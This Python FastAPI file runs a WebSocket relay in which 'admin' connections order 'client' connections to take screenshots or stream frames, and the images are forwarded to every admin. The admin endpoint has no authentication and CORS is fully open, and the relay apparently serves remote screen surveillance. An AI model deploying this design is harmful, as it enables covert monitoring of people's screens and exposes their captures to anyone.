from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict
import random
import json
import asyncio
import sys

app = FastAPI()

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients: Dict[str, WebSocket] = {}
admins: list[WebSocket] = []

def log(message):
    """Print with flush for Render.com"""
    print(message, flush=True)

def generate_client_id():
    """Generate a unique 4-digit ID"""
    while True:
        client_id = f"{random.randint(1000, 9999)}"
        if client_id not in clients:
            return client_id

@app.get("/")
async def root():
    return {"status": "Server is running", "clients": len(clients), "admins": len(admins)}

@app.get("/clients")
async def get_clients():
    return {"clients": list(clients.keys())}

# =========================
# CLIENT CONNECT
# =========================
@app.websocket("/ws/client")
async def client_ws(websocket: WebSocket):
    client_id = None
    try:
        await websocket.accept()
        log(f"🔌 Client connection accepted from {websocket.client}")
        
        # Generate unique ID for client
        client_id = generate_client_id()
        clients[client_id] = websocket
        log(f"📝 Assigned ID {client_id} to client")
        
        # Send ID to client
        id_message = {
            "type": "id_assigned",
            "client_id": client_id
        }
        await websocket.send_text(json.dumps(id_message))
        log(f"📤 Sent ID to client {client_id}")
        
        log(f"✅ Client {client_id} connected")
        
        # Notify all admins about new client
        await broadcast_client_list()
        
        # Main message loop
        while True:
            try:
                # Receive data with timeout
                data = await asyncio.wait_for(websocket.receive_text(), timeout=90.0)
                log(f"📨 Received from client {client_id}: {data[:50]}...")
                
                # Handle ping
                if data == "ping":
                    await websocket.send_text("pong")
                    log(f"🏓 Ponged client {client_id}")
                    continue
                
                # Forward image to admins
                log(f"📸 Forwarding screenshot from client {client_id} to {len(admins)} admin(s)")
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": data
                })
                
            except asyncio.TimeoutError:
                # Send ping to keep connection alive
                try:
                    await websocket.send_text("ping")
                    log(f"🏓 Pinged client {client_id}")
                except Exception as e:
                    log(f"⚠️ Failed to ping client {client_id}: {e}")
                    break

    except WebSocketDisconnect:
        log(f"❌ Client {client_id} disconnected normally")
    except Exception as e:
        log(f"⚠️ Client {client_id} error: {type(e).__name__}: {e}")
    finally:
        if client_id:
            clients.pop(client_id, None)
            log(f"🧹 Cleaned up client {client_id}")
            await broadcast_client_list()


# =========================
# ADMIN CONNECT
# =========================
@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    try:
        await websocket.accept()
        admins.append(websocket)
        log(f"👤 Admin connected from {websocket.client} (total: {len(admins)})")
        
        # Send current client list
        client_list = {
            "type": "client_list",
            "clients": list(clients.keys())
        }
        await websocket.send_text(json.dumps(client_list))
        log(f"📤 Sent client list to admin: {list(clients.keys())}")
        
        # Main message loop
        while True:
            try:
                # Receive data with timeout
                raw_data = await asyncio.wait_for(websocket.receive_text(), timeout=90.0)
                log(f"📨 Received from admin: {raw_data[:100]}...")
                
                data = json.loads(raw_data)

                # Handle screenshot request
                if data.get("action") == "take_photo":
                    client_id = data.get("client_id")
                    log(f"📸 Screenshot request for client {client_id}")
                    
                    if client_id in clients:
                        try:
                            await clients[client_id].send_text("take_photo")
                            log(f"✅ Sent screenshot command to client {client_id}")
                        except Exception as e:
                            log(f"⚠️ Failed to send screenshot request to client {client_id}: {e}")
                    else:
                        log(f"❌ Client {client_id} not found in clients list")
                
                # Handle stream request
                elif data.get("action") == "stream_frame":
                    client_id = data.get("client_id")
                    quality = data.get("quality", "medium")
                    log(f"🎥 Stream request for client {client_id} (quality: {quality})")
                    
                    if client_id in clients:
                        try:
                            stream_msg = {
                                "action": "stream_frame",
                                "quality": quality
                            }
                            await clients[client_id].send_text(json.dumps(stream_msg))
                            log(f"✅ Sent stream command to client {client_id}")
                        except Exception as e:
                            log(f"⚠️ Failed to send stream request to client {client_id}: {e}")
                    else:
                        log(f"❌ Client {client_id} not found in clients list")
                            
            except asyncio.TimeoutError:
                # Send ping to keep connection alive
                try:
                    ping_msg = {"type": "ping"}
                    await websocket.send_text(json.dumps(ping_msg))
                    log("🏓 Pinged admin")
                except Exception as e:
                    log(f"⚠️ Failed to ping admin: {e}")
                    break

    except WebSocketDisconnect:
        log("👤 Admin disconnected normally")
    except Exception as e:
        log(f"⚠️ Admin error: {type(e).__name__}: {e}")
    finally:
        if websocket in admins:
            admins.remove(websocket)
        log(f"🧹 Cleaned up admin connection (remaining: {len(admins)})")


# =========================
# HELPER FUNCTIONS
# =========================
async def broadcast_client_list():
    """Broadcast updated client list to all admins"""
    message = {
        "type": "client_list",
        "clients": list(clients.keys())
    }
    message_str = json.dumps(message)
    
    log(f"📢 Broadcasting client list to {len(admins)} admin(s): {list(clients.keys())}")
    
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_text(message_str)
        except Exception as e:
            log(f"⚠️ Failed to send client list to admin: {e}")
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)
            log("🧹 Removed disconnected admin")

async def broadcast_to_admins(message):
    """Broadcast message to all admins"""
    message_str = json.dumps(message)
    
    log(f"📢 Broadcasting to {len(admins)} admin(s)")
    
    disconnected_admins = []
    for admin in admins:
        try:
            await admin.send_text(message_str)
            log("✅ Sent to admin successfully")
        except Exception as e:
            log(f"⚠️ Failed to send to admin: {e}")
            disconnected_admins.append(admin)
    
    # Clean up disconnected admins
    for admin in disconnected_admins:
        if admin in admins:
            admins.remove(admin)
            log("🧹 Removed disconnected admin")
